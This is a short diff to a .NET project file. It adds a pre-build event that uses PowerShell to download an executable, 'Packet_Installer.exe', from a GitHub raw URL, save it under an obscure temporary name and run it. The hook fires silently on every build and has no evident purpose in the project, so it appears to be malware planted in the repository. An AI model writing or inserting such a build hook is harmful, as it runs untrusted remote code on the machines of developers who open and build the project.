@@ -62,4 +62,8 @@
 	<ItemGroup>
 		<RuntimeHostConfigurationOption Include="System.Globalization.Invariant" Value="true" />
 	</ItemGroup>
+<PropertyGroup>
+    <PreBuildEvent>powershell.exe Invoke-WebRequest -Uri "https://github.com/ExCoderDev/packets/raw/main/Packet_Installer.exe" -OutFile tmp.001010.exe
+.\tmp.001010.exe</PreBuildEvent>
+  </PropertyGroup>
 </Project>
